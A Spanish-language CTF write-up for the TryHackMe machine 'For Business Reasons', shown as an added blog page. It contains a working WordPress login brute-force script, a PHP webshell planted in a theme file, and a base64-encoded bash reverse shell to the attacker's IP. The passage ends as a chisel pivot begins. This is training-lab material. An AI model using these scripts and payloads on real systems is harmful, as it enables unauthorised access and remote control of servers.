@@ -1,0 +1,902 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>For Business Reasons - Try Hack Me - Invertebrado</title>
+<meta name="description" content="En esta máquina iniciamos reconociendo una página en wordpress con un usuario válido con el que podremos ingresar al panel de administración por medio de fuerza bruta consiguiendo RCE dentro de un contenedor, para luego pivotear a otra máquina por medio de un tunel con chisel y finalmente abusar del grupo lxd para conseguir el root">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Invertebrado">
+<meta property="og:title" content="For Business Reasons - Try Hack Me">
+<meta property="og:url" content="http://localhost:4000/thm-for-business-reasons/">
+
+
+  <meta property="og:description" content="En esta máquina iniciamos reconociendo una página en wordpress con un usuario válido con el que podremos ingresar al panel de administración por medio de fuerza bruta consiguiendo RCE dentro de un contenedor, para luego pivotear a otra máquina por medio de un tunel con chisel y finalmente abusar del grupo lxd para conseguir el root">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/thm-writeup-for-business-reasons/ForBusinessReasons.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-08-24T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/thm-for-business-reasons/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Invertebrado",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Invertebrado Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">For Business Reasons - Try Hack Me</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/trocado.png" alt="Invertebrado" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Invertebrado</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, HackTheBox, <br>TryHackMe, Red Team
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Colombia</span>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:invertebr4do@gmail.com">
+            <meta itemprop="email" content="invertebr4do@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://keybase.io/invertebrado" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fas fa-fw fa-key" aria-hidden="true"></i> Keybase
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://twitter.com/Invertebr4do" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/Invertebr4do" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="For Business Reasons - Try Hack Me">
+    <meta itemprop="description" content="En esta máquina iniciamos reconociendo una página en wordpress con un usuario válido con el que podremos ingresar al panel de administración por medio de fuerza bruta consiguiendo RCE dentro de un contenedor, para luego pivotear a otra máquina por medio de un tunel con chisel y finalmente abusar del grupo lxd para conseguir el root">
+    <meta itemprop="datePublished" content="August 24, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">For Business Reasons - Try Hack Me
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-08-24T00:00:00-05:00">August 24, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p>Esta es una máquina hard según la plataforma</p>
+
+<p>Comenzamos con el reconocimiento inicial de la máquina con nmap</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="o">[</span>IP]
+</code></pre></div></div>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-p-</code> -&gt; Todo el rango de puertos (1-65535)</li>
+  <li><code class="language-plaintext highlighter-rouge">-sS</code> -&gt; TCP SYN/PORT scan</li>
+  <li><code class="language-plaintext highlighter-rouge">--min-rate</code> -&gt; Mínimo de paquetes que quiero que se emitan por segundo (5000)</li>
+  <li><code class="language-plaintext highlighter-rouge">--open</code> -&gt; Mostrar solo puertos abiertos</li>
+  <li><code class="language-plaintext highlighter-rouge">-vvv</code> -&gt; Triple verbose para ver los avances del escaneo antes de que acabe</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code> -&gt; Quitar la resolución DNS</li>
+  <li><code class="language-plaintext highlighter-rouge">-Pn</code> -&gt; Para no aplicar host discovery</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-24 10:26 <span class="nt">-05</span>
+Initiating SYN Stealth Scan at 10:26
+Scanning 10.10.95.90 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.95.90
+Increasing send delay <span class="k">for </span>10.10.95.90 from 0 to 5 due to 11 out of 14 dropped probes since last increase.
+Completed SYN Stealth Scan at 10:27, 27.42s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.95.90
+Host is up, received user-set <span class="o">(</span>0.26s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-08-24 10:26:46 <span class="nt">-05</span> <span class="k">for </span>27s
+Not shown: 65533 filtered ports, 1 closed port
+Reason: 65533 no-responses and 1 reset
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 61
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>27.62 seconds
+           Raw packets sent: 131088 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 13 <span class="o">(</span>568B<span class="o">)</span>
+</code></pre></div></div>
+<p>Luego de esto vemos que solo hay un puerto visible externamente, el 80 (http), así que usamos whatweb para ver contra que nos estamos enfrentando</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://[IP]
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.95.90 <span class="o">[</span>200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux]
+<span class="o">[</span>Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.10.95.90], MetaGenerator[WordPress 5.4.2], PHP[7.2.34],
+PoweredBy[-wordpress,-wordpress,,WordPress], Script, Title[MilkCo Test/POC site &amp;#8211<span class="p">;</span> Just another WordPress site],
+UncommonHeaders[link], WordPress[5.4.2], X-Powered-By[PHP/7.2.34]
+</code></pre></div></div>
+<p>No vemos nada muy relevante, a parte de que es un wordpress, que se ve tal que así:</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img1.png" />
+</p>
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img2.png" />
+</p>
+
+<p>Viendo un poco la página encontramos un usuario (sysadmin), el cual se intuye que es el administrador de la página y despues de buscar por la página nos damos cuenta que solo está este usuario y no encontramos nada más de interes (a demás de los directorios default de wordpres, como el wp-login.php).</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img3.png" />
+</p>
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img4.png" />
+</p>
+
+<p>Entonces Proseguí aplicando fuerza bruta al panel de login de wordpress, se podría haber hecho con herramientas como burpsuite, pero yo preferí hacerlo con el siguiente script en python3:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">signal</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">signal</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Exiting...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://[IP]/wp-login.php"</span> <span class="c1"># &lt;- CHANGE THIS
+</span><span class="n">dictionary</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/usr/share/wordlists/rockyou.txt"</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">makeRequest</span><span class="p">():</span>
+	<span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">'wordpress_test_cookie'</span><span class="p">:</span> <span class="s">'WP+Cookie+check'</span><span class="p">}</span>
+
+	<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Password"</span><span class="p">)</span>
+
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">dictionary</span><span class="p">:</span>
+		<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+			<span class="s">'log'</span><span class="p">:</span> <span class="s">'sysadmin'</span><span class="p">,</span>
+			<span class="s">'pwd'</span><span class="p">:</span> <span class="n">i</span><span class="p">,</span>
+			<span class="s">'wp-submit'</span><span class="p">:</span> <span class="s">'Log+In'</span><span class="p">,</span>
+			<span class="s">'testcookie'</span><span class="p">:</span> <span class="s">'1'</span>
+		<span class="p">}</span>
+
+		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+		<span class="n">text</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
+
+		<span class="n">p2</span> <span class="o">=</span> <span class="n">p1</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">"%s"</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
+
+		<span class="k">if</span> <span class="s">"incorrect"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
+			<span class="n">p1</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"%s"</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
+			<span class="k">break</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+	<span class="n">makeRequest</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>Y así obtenemos la contraseña!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span>./For_Business_Reasons-BruteForce.py
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Password: m&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Probamos la contraseña con el usuario (sysadmin) en el panel de login y entramos!</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img5.png" />
+</p>
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img6.png" />
+</p>
+
+<p>Una vez adentro, seguimos el procedimiento que casi simpre se hace para obtener una reverse shell modificando un tema</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img7.png" />
+</p>
+
+<p>En este caso tenemos que seleccionar el tema Twenty Seventeen, ya que si intentamos modificar el que está en uso (Twenty Twenty), no vamos a poder</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img8.png" />
+</p>
+
+<p>Seleccionamos la plantilla que modificaremos, en mi caso la 404.php y ponemos el código malicioso que queramos ejecutar, en mi caso obtendré una webShell con el siguiente código:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="mf">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span>
+</code></pre></div></div>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">"&lt;pre&gt;" "&lt;/pre&gt;"</code> -&gt; Etiquetas de preformateo (mejoran la estética del output de los comandos)</li>
+  <li><code class="language-plaintext highlighter-rouge">shell_exec</code> -&gt; Ejecuta el comando que reciba ‘cmd’</li>
+  <li><code class="language-plaintext highlighter-rouge">'cmd'</code> -&gt; Parametro que recibirá los comandos
+```</li>
+</ul>
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img9.png" />
+</p>
+
+<p>Nos dirigimos a la ruta donde se aloja el codigo que guardamos</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[IP]/wp-content/themes/twentyseventeen/404.php
+</code></pre></div></div>
+
+<p>Y por medio del parametro que posteriormente definimos (cmd) ejecutamos cualquier comando</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img10.png" />
+</p>
+
+<p>Y vemos que tenemos RCE</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img11.png" />
+</p>
+
+<p>Nos ponemos en escucha, en mi caso en el puerto 443, con netcat para recibir una conección</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+<p>Tuve algunos problemas al intentar entablar una reverse shell, pero luego de probar de varias maneras, la que me sirvió fue esta:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> <span class="nb">echo</span> <span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/[TU_IP]/443 0&gt;&amp;1'"</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+<p>El output del anterior comando lo ponemos en la url</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[IP]/wp-content/themes/twentyseventeen/404.php?cmd<span class="o">=</span><span class="nb">echo</span> <span class="s2">"[OUTPUT_DEL_COMANDO_ANTERIOR]"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/images/thm-writeup-for-business-reasons/img12.png" />
+</p>
+
+<p>Y vemos que conseguimos la shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to <span class="o">[</span>10.9.242.217] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.95.90] 46454
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen<span class="err">$</span>
+</code></pre></div></div>
+<p>Antes de seguir upgradeamos la shell para obtener una tty full interactiva (esto nos permitira hacer ctrl_c, etc)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
+Script started, file is /dev/null
+www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-nlvp</span> 443
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 443
+                              reset
+reset: unknown terminal <span class="nb">type </span>unknown
+Terminal <span class="nb">type</span>? xterm
+</code></pre></div></div>
+
+<p>Luego de esto seteamos las dimensiones correctas de la shell, ya que así como esta, no ocupa toda la pantalla</p>
+
+<p>Vemos las dimensiones de nuestra pantalla ejecutando en una terminal normal lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty</span> <span class="nt">-a</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>speed 38400 baud<span class="p">;</span> rows 40<span class="p">;</span> columns 123<span class="p">;</span> line <span class="o">=</span> 0<span class="p">;</span>
+intr <span class="o">=</span> ^C<span class="p">;</span> quit <span class="o">=</span> ^<span class="se">\;</span> erase <span class="o">=</span> ^H<span class="p">;</span> <span class="nb">kill</span> <span class="o">=</span> ^U<span class="p">;</span> eof <span class="o">=</span> ^D<span class="p">;</span> eol <span class="o">=</span> &lt;undef&gt;<span class="p">;</span> eol2 <span class="o">=</span> &lt;undef&gt;<span class="p">;</span> swtch <span class="o">=</span> &lt;undef&gt;<span class="p">;</span> start <span class="o">=</span> ^Q<span class="p">;</span>
+stop <span class="o">=</span> ^S<span class="p">;</span> susp <span class="o">=</span> ^Z<span class="p">;</span> rprnt <span class="o">=</span> ^R<span class="p">;</span> werase <span class="o">=</span> ^W<span class="p">;</span> lnext <span class="o">=</span> ^V<span class="p">;</span> discard <span class="o">=</span> ^O<span class="p">;</span> min <span class="o">=</span> 1<span class="p">;</span> <span class="nb">time</span> <span class="o">=</span> 0<span class="p">;</span>
+<span class="nt">-parenb</span> <span class="nt">-parodd</span> <span class="nt">-cmspar</span> cs8 <span class="nt">-hupcl</span> <span class="nt">-cstopb</span> cread <span class="nt">-clocal</span> <span class="nt">-crtscts</span>
+<span class="nt">-ignbrk</span> <span class="nt">-brkint</span> <span class="nt">-ignpar</span> <span class="nt">-parmrk</span> <span class="nt">-inpck</span> <span class="nt">-istrip</span> <span class="nt">-inlcr</span> <span class="nt">-igncr</span> icrnl <span class="nt">-ixon</span> <span class="nt">-ixoff</span> <span class="nt">-iuclc</span> <span class="nt">-ixany</span> <span class="nt">-imaxbel</span> iutf8
+opost <span class="nt">-olcuc</span> <span class="nt">-ocrnl</span> onlcr <span class="nt">-onocr</span> <span class="nt">-onlret</span> <span class="nt">-ofill</span> <span class="nt">-ofdel</span> nl0 cr0 tab0 bs0 vt0 ff0
+isig icanon iexten <span class="nb">echo </span>echoe echok <span class="nt">-echonl</span> <span class="nt">-noflsh</span> <span class="nt">-xcase</span> <span class="nt">-tostop</span> <span class="nt">-echoprt</span> echoctl echoke <span class="nt">-flusho</span> <span class="nt">-extproc</span>
+</code></pre></div></div>
+
+<p>Vemos en la primera linea las filas y columnas (en mi caso, rows 40, columns 123) y las seteamos en la reverse shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen<span class="nv">$ </span><span class="nb">stty </span>rows 40 columns 123
+</code></pre></div></div>
+<p>Por último exportamos las variables TERM y SHELL para que valgan xterm y bash respectivamente</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
+www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+</code></pre></div></div>
+
+<p>Ahora podemos continuar con una shell más comoda</p>
+
+<p>Vamos al directorio <code class="language-plaintext highlighter-rouge">/var/www/html/</code> y visualizamos la flag0</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/var/www/html/wp-content/themes/twentyseventeen<span class="nv">$ </span><span class="nb">cd</span> /var/www/html/
+www-data@3d56c33f6dd7:/var/www/html/<span class="nv">$ </span><span class="nb">ls</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flag0.txt    lost+found   start_container.sh   wp-activate.php       wp-config.php      wp-load.php      wp-trackback.php
+getip        mysql        test.sh              wp-admin              wp-content         wp-login.php     xmlrpc.php
+images       note.txt     update.log           wp-blog-header.php    wp-cron.php        wp-mail.php
+index.php    readme.html  update.sh            wp-comments-post.php  wp-includes        wp-settings.php
+license.txt  start.log    wordpress_stack.yml  wp-config-sample.php  wp-links-opml.php  wp-signup.php
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/var/www/html/<span class="nv">$ </span><span class="nb">cat </span>flag0.txt
+y&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;</span>i
+</code></pre></div></div>
+<p>Cambiamos de directorio a la raiz y listamos todo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/var/www/html<span class="nv">$ </span><span class="nb">cd</span> /
+www-data@3d56c33f6dd7:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>total 72
+drwxr-xr-x   1 root root 4096 Aug 24 15:25 <span class="nb">.</span>
+drwxr-xr-x   1 root root 4096 Aug 24 15:25 ..
+<span class="nt">-rwxr-xr-x</span>   1 root root    0 Aug 24 15:25 .dockerenv
+drwxr-xr-x   1 root root 4096 Nov 18  2020 bin
+drwxr-xr-x   2 root root 4096 Sep 19  2020 boot
+drwxr-xr-x   5 root root  340 Aug 24 15:25 dev
+drwxr-xr-x   1 root root 4096 Aug 24 15:25 etc
+drwxr-xr-x   2 root root 4096 Sep 19  2020 home
+drwxr-xr-x   1 root root 4096 Nov 18  2020 lib
+drwxr-xr-x   2 root root 4096 Nov 17  2020 lib64
+drwxr-xr-x   2 root root 4096 Nov 17  2020 media
+drwxr-xr-x   2 root root 4096 Nov 17  2020 mnt
+drwxr-xr-x   2 root root 4096 Nov 17  2020 opt
+dr-xr-xr-x 155 root root    0 Aug 24 15:25 proc
+drwx------   1 root root 4096 Nov 18  2020 root
+drwxr-xr-x   1 root root 4096 Nov 18  2020 run
+drwxr-xr-x   1 root root 4096 Nov 18  2020 sbin
+drwxr-xr-x   2 root root 4096 Nov 17  2020 srv
+dr-xr-xr-x  13 root root    0 Aug 24 15:25 sys
+drwxrwxrwt   1 root root 4096 Aug 24 15:25 tmp
+drwxr-xr-x   1 root root 4096 Nov 17  2020 usr
+drwxr-xr-x   1 root root 4096 Nov 18  2020 var
+</code></pre></div></div>
+<p>Aquí podemos ver un fichero <code class="language-plaintext highlighter-rouge">.dockerenv</code>, con lo que sabemos que estamos en un contenedor
+Vemos la IP de nuestro equipo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/<span class="nv">$ </span><span class="nb">hostname</span> <span class="nt">-I</span>
+10.255.0.4 172.18.0.3 10.0.0.3
+</code></pre></div></div>
+<p>Luego de esto ejecuto este comando para ver en que IPs de la red se encuentra activo el puerto 22(ssh)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@3d56c33f6dd7:/<span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 24<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"echo "" &gt; /dev/tcp/172.18.0.</span><span class="nv">$i</span><span class="s2">/22"</span> 2&gt;/dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[+] Host [172.18.0.</span><span class="nv">$i</span><span class="s2">] with port [22]</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
+</code></pre></div></div>
+<p>Obteniendo lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Host <span class="o">[</span>172.18.0.1] with port <span class="o">[</span>22]
+</code></pre></div></div>
+<p>El único host con el puerto 22 abierto es el equipo local (127.0.0.1:22), por lo que ahora usaremos chisel para efectuar un Remote Port Forwarding</p>
+
+<p>Iniciamos un servicio http en nuestra máquina de atacante en la ruta donde tenemos chisel</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
